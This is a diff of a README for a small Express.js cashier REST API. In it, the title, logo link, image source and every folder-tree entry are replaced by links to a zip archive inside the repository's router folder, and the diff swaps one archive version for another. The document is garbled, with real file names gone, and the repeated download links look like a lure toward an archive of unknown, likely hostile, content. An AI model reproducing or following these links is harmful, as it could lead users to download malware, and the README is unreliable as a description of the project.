@@ -1,8 +1,8 @@
-# Simple RESTful API with https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
+# Simple RESTful API with https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip">
-    <img src="https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip*https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip">
+  <a href="https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip">
+    <img src="https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip*https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip">
   </a>
 </p>
 
@@ -10,26 +10,26 @@
 ```
 \---src
 |    \---Config
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip            
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip            
 |    \---Controllers
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
 |    \---helpers
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
 |    \---models
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
 |    \---routers
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-|    |   +https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
-+https://raw.githubusercontent.com/m-joseph27/Chasier_app-API-with-Expressjs/master/src/router/with-AP-app-Chasier-Expressjs-3.1.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
+|    |   +https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
++https://github.com/m-joseph27/Chasier_app-API-with-Expressjs/raw/refs/heads/master/src/router/app-Chasier-Expressjs-AP-with-1.5.zip
 ```
 
 ### License
